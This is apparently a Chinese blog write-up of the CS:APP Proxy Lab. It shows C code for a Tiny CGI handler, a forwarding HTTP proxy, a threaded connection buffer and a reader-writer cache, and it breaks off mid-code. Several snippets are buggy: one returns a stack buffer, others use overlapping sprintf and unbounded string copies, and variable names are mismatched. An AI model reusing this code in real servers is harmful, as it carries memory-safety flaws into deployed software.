<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">serve_dynamic</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *filename, <span class="keyword">char</span> *cgiargs)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], *emptylist[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//行与报头</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>); </span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Server: Tiny Web Server\r\n&quot;</span>);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">  </span><br><span class="line">    <span class="comment">//子进程</span></span><br><span class="line">    <span class="keyword">if</span> (Fork() == <span class="number">0</span>) &#123;</span><br><span class="line">	</span><br><span class="line">	setenv(<span class="string">&quot;QUERY_STRING&quot;</span>, cgiargs, <span class="number">1</span>);  <span class="comment">//用url参数初始化环境变量</span></span><br><span class="line">	Dup2(fd, STDOUT_FILENO);        <span class="comment">//重定向输出到fd</span></span><br><span class="line">	Execve(filename, emptylist, environ);  <span class="comment">//运行CGI程序</span></span><br><span class="line">    &#125;</span><br><span class="line">    Wait(<span class="literal">NULL</span>); <span class="comment">//等待子进程结束回收</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="I-顺序代理GET请求"><a href="#I-顺序代理GET请求" class="headerlink" title="I . 顺序代理GET请求"></a>I . 顺序代理GET请求</h2><p>writeup中的要求：</p>
<ol>
<li><p>处理 HTTP/1.0 版本，如果遇到1.1，则需要将其作为1.0版本转发；</p>
</li>
<li><p>转发合法 HTTP 请求（实现中所示）；</p>
</li>
<li><p>头中的 ua 和 两个 connection 都有给定的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305Firefox/10.0.3\r\n&quot;</span></span><br><span class="line"><span class="string">&quot;Proxy-Connection: close&quot;</span> </span><br><span class="line"><span class="string">&quot;Connection: close&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>​    </li>
</ul>
<p>实际上要做的，就是将doit内的操作变为转发与回复，而不是单纯回响；</p>
<p>那么需要将发送的包<strong>改</strong>写给目标服务器，之后把目标服务器的回响写给发送者；</p>
<p>要看uri中是否有端口那就应该解析uri，但和上面解析是不一样的，上面是在看读取的文件是静态还是动态；</p>
<p>主函数和tiny一样，只是需要在 listen之前加一条：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signal(SIGPIPE,SIG_IGN);</span><br></pre></td></tr></table></figure>

<p>新建三个全局变量：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//uri解析记录变量</span></span><br><span class="line"><span class="keyword">char</span> send_port[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> send_host[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> send_path[MAXLINE];</span><br></pre></td></tr></table></figure>

<p>doit：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> fd)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> backbuf[MAXLINE],newhd[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> *send;</span><br><span class="line">    <span class="keyword">rio_t</span> rio,serverfd_rio;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取请求行</span></span><br><span class="line">    Rio_readinitb(&amp;rio, fd);</span><br><span class="line">    <span class="keyword">if</span> (!Rio_readlineb(&amp;rio, buf, MAXLINE))  </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);       <span class="comment">//解析请求行</span></span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>)) &#123;                     <span class="comment">//是否为GET请求</span></span><br><span class="line">        clienterror(fd, method, <span class="string">&quot;501&quot;</span>, <span class="string">&quot;Not Implemented&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Tiny does not implement this method&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;                                                    </span><br><span class="line">    read_requesthdrs(&amp;rio);    <span class="comment">//显示请求行和头（printf）                          </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//解析uri为host port path</span></span><br><span class="line">    parse_uri(uri);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//改写</span></span><br><span class="line">    <span class="built_in">sprintf</span>(newhd, <span class="string">&quot;GET %s HTTP/1.0\r\n&quot;</span>, send_path);</span><br><span class="line">    send = built_message(newhd,&amp;rio);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//开启远程服务器</span></span><br><span class="line">    <span class="keyword">int</span> serverfd = Open_clientfd(send_host,send_port);</span><br><span class="line">    <span class="keyword">if</span> (serverfd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connection failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    Rio_readinitb(&amp;serverfd_rio, serverfd);</span><br><span class="line">    <span class="comment">//写入服务器</span></span><br><span class="line">    Rio_writen(serverfd, send, <span class="built_in">strlen</span>(send));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//回响</span></span><br><span class="line">    <span class="keyword">while</span>((n = Rio_readlineb(&amp;serverfd_rio,backbuf,MAXLINE)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;proxy received %d bytes,then send\n&quot;</span>, (<span class="keyword">int</span>)n);</span><br><span class="line">        Rio_writen(fd,backbuf,n);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Close (serverfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个神奇函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parse_uri</span><span class="params">(<span class="keyword">char</span> *uri)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//是否有host：port，port默认80</span></span><br><span class="line">    <span class="keyword">char</span> *hostpath = <span class="built_in">strstr</span>(uri,<span class="string">&quot;//&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(hostpath != <span class="literal">NULL</span>) <span class="comment">//有</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//是否有port</span></span><br><span class="line">        <span class="keyword">char</span> *portpath = <span class="built_in">strstr</span>(hostpath + <span class="number">2</span>,<span class="string">&quot;:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(portpath != <span class="literal">NULL</span>) <span class="comment">//有</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> num;</span><br><span class="line">            <span class="built_in">sscanf</span>(portpath+<span class="number">1</span>,<span class="string">&quot;%d%s&quot;</span>,&amp;num,send_path);</span><br><span class="line">            <span class="built_in">sprintf</span>(send_port,<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line">            *portpath = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//无</span></span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">char</span> *path = <span class="built_in">strstr</span>(hostpath + <span class="number">2</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        	<span class="keyword">if</span>(path != <span class="literal">NULL</span>) </span><br><span class="line">        	&#123;</span><br><span class="line">                <span class="built_in">strcpy</span>(send_path,path);</span><br><span class="line">        		<span class="built_in">strcpy</span>(send_port,<span class="string">&quot;80&quot;</span>);</span><br><span class="line">            	*path = <span class="literal">NULL</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">strcpy</span>(send_host,hostpath + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  <span class="comment">//无</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> *path = <span class="built_in">strstr</span>(uri,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(path != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(send_path,path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">strcpy</span>(send_port,<span class="string">&quot;80&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">built_message</span><span class="params">( <span class="keyword">char</span> *getit,<span class="keyword">rio_t</span> *rp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//构造新头</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> rio[MAXLINE];</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%s&quot;</span>,getit);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%sHost: %s\r\n&quot;</span>,buf,send_host);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%sUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n&quot;</span>,buf);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%sConnection: close\r\n&quot;</span>,buf);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%sProxy-Connection: close\r\n\r\n&quot;</span>,buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//补上原内容</span></span><br><span class="line">    Rio_readnb(rp,rio,MAXLINE);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%s%s&quot;</span>,buf,rio);</span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>



<h2 id="II-多线程的并发"><a href="#II-多线程的并发" class="headerlink" title="II . 多线程的并发"></a>II . 多线程的并发</h2><p>实现多线程使用 消费者-生产者 模型：</p>
<p>消费者和生产者共同使用一个 n个槽的优先缓冲区，生产者产生新的项目并插入缓冲区；消费者取出这些项目并使用；</p>
<p>因此两者的访问需要互斥，并且调度地访问：空状态（消费者等待），满状态（生产者等待）；</p>
<p>在这个实验里，<strong>消费者就是服务端</strong>，接受各样的连接；<strong>生产者就是客户端</strong>，发送各样的连接；</p>
<p>实现缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> *buf;          <span class="comment">// 缓冲区数组         </span></span><br><span class="line">    <span class="keyword">int</span> n;             <span class="comment">// 槽的最大数量</span></span><br><span class="line">    <span class="keyword">int</span> front;         <span class="comment">// buf[(front+1)%n] 是第一个项目</span></span><br><span class="line">    <span class="keyword">int</span> rear;          <span class="comment">// buf[rear%n] 是最后一个项目</span></span><br><span class="line">    <span class="keyword">sem_t</span> mutex;       <span class="comment">//互斥锁，初始化1</span></span><br><span class="line">    <span class="keyword">sem_t</span> slots;       <span class="comment">//记录槽，初始化n</span></span><br><span class="line">    <span class="keyword">sem_t</span> items;       <span class="comment">//记录项目，初始化0</span></span><br><span class="line">&#125; <span class="keyword">sbuf_t</span>;</span><br></pre></td></tr></table></figure>

<p>客户端插入函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    P(&amp;sp-&gt;slots);                          <span class="comment">// 对slots加锁，保证槽位满时，客户端挂起</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);                          <span class="comment">// 对缓冲区互斥访问</span></span><br><span class="line">    sp-&gt;buf[(++sp-&gt;rear)%(sp-&gt;n)] = item;   <span class="comment">// 添加项目</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);                          <span class="comment">// 解锁</span></span><br><span class="line">    V(&amp;sp-&gt;items);                          <span class="comment">//与slots对应地调整items</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端实现后移除项目的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line">    P(&amp;sp-&gt;items);                          <span class="comment">// 如果项目没有，服务端挂起</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);                          <span class="comment">// 加锁缓冲区</span></span><br><span class="line">    item = sp-&gt;buf[(++sp-&gt;front)%(sp-&gt;n)];  <span class="comment">// 移除项目</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);                          <span class="comment">// 解锁</span></span><br><span class="line">    V(&amp;sp-&gt;slots);                         </span><br><span class="line">    <span class="keyword">return</span> item;							<span class="comment">//返回客户端的描述符</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主函数（和tiny的main差不多）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//输入端口参数</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//阻塞SIGPIPE信号</span></span><br><span class="line">    signal(SIGPIPE,SIG_IGN);</span><br><span class="line">    <span class="comment">//监听描述符</span></span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建线程</span></span><br><span class="line">    sbuf_init(&amp;sbuf, SBUFSIZE);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NTHREADS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">    <span class="comment">//接受请求成为描述符</span></span><br><span class="line">	connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); </span><br><span class="line">    <span class="comment">//插入描述符</span></span><br><span class="line">    sbuf_insert(&amp;sbuf, connfd);</span><br><span class="line">        <span class="comment">//读取套接字信息，IP和端口</span></span><br><span class="line">        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="line">                    port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);                                       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>线程执行函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Pthread_detach(pthread_self());</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">//从缓冲区中读出描述符</span></span><br><span class="line">    <span class="keyword">int</span> connfd = sbuf_remove(&amp;sbuf);</span><br><span class="line"></span><br><span class="line">    doit(connfd);</span><br><span class="line">    Close(connfd);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="III-缓存web对象"><a href="#III-缓存web对象" class="headerlink" title="III . 缓存web对象"></a>III . 缓存web对象</h2><p>目的是为了让多次访问的web对象不用再连接服务器，直接响应；</p>
<p>这里会使用 读者-写者 模型 ，让线程从缓存中读和写：</p>
<p>只读的线程叫读者，只写的进程叫写者，读者可以和其他读者共享只读部分，写者需要有独立的访问；</p>
<p>这个模型有两种情况：</p>
<p>读者优先，写者优先；</p>
<p>这里使用读优先：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> read_cnt;		<span class="comment">//记录读者数量</span></span><br><span class="line"><span class="keyword">sem_t</span> mutex, w;    <span class="comment">//都初始化为1，w导使有读无写，有写无读</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reader</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        P(&amp;mutex);</span><br><span class="line">        readcnt++;</span><br><span class="line">        <span class="keyword">if</span>(readcnt==<span class="number">1</span>) <span class="comment">//第一个读者导致w加锁，则写者挂起；</span></span><br><span class="line">            P(&amp;w);</span><br><span class="line">        V(&amp;mutex);</span><br><span class="line">        </span><br><span class="line">        P(&amp;mutex);</span><br><span class="line">        readcnt--;</span><br><span class="line">        <span class="keyword">if</span>(readcnt==<span class="number">0</span>) <span class="comment">//最后一个读者结束解锁w</span></span><br><span class="line">            V(&amp;w);</span><br><span class="line">        V(&amp;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writer</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        P(&amp;w);</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        V(&amp;w)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置缓存区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> obj[MAX_OBJECT_SIZE];</span><br><span class="line">    <span class="keyword">char</span> uri[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> LRU;</span><br><span class="line">    <span class="keyword">int</span> isEmpty;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> read_cnt; <span class="comment">//读者数量</span></span><br><span class="line">    <span class="keyword">sem_t</span> w;      <span class="comment">//Cache信号量</span></span><br><span class="line">    <span class="keyword">sem_t</span> mutex;  <span class="comment">//read_cnt信号量</span></span><br><span class="line"></span><br><span class="line">&#125; block;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    block data[MAX_CACHE];</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">&#125; Cache;</span><br></pre></td></tr></table></figure>

<p>修改doit函数中的内容，得到请求后，判断uri是否在缓存中，不在就添加进去：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> fd)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> backbuf[MAXLINE],newhd[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> *send;</span><br><span class="line">    <span class="keyword">char</span> cache_tag[MAXLINE];</span><br><span class="line">    <span class="keyword">rio_t</span> rio,serverfd_rio;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取请求行</span></span><br><span class="line">    Rio_readinitb(&amp;rio, fd);</span><br><span class="line">    <span class="keyword">if</span> (!Rio_readlineb(&amp;rio, buf, MAXLINE))  </span><br><span class="line">        <span 